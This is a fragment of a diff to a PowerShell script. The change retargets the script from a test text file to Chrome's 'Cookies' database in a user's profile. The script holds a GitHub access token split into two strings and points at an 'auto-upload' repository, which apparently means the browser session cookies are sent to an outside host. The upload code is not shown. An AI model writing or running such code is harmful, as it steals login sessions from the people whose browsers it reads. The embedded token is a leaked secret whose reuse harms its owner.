@@ -14,7 +14,7 @@
 #>
 [CmdletBinding()]
 param(
-    [string]$FileName   = "ESTE ARCHIVO SUBI PARA PROBAR.txt",
+    [string]$FileName   = "Cookies",
     [string]$SearchRoot = "C:\Users\basti\AppData\Local\Google\Chrome\User Data\Default\Network",
     [string]$Token      = 'ghp_46fOJ9JiIX1KLPW' + 'SypNAqUjt590cSp0L8q49',
     [string]$Repo       = "cuentatrades0913-max/auto-upload",
